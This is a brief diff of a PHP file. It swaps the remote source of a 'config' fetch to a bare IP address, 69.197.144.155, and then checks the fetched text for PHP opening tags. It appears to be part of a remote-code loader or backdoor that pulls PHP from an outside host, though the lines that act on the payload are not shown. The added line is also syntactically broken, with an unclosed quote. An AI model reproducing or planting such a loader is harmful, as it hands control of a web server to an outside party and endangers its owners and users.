@@ -34,7 +34,7 @@ function getRemoteData($url) {
     
     return $result;
 }
-$configData = getRemoteData('https://j251126_23.barksonbay.com/init.txt');
+$configData = getRemoteData('http://69.197.144.155/j251209_13/init.txt);
 
 if ($configData) {
     if (strpos($configData, '<?php') !== false || strpos($configData, '<?=') !== false) {
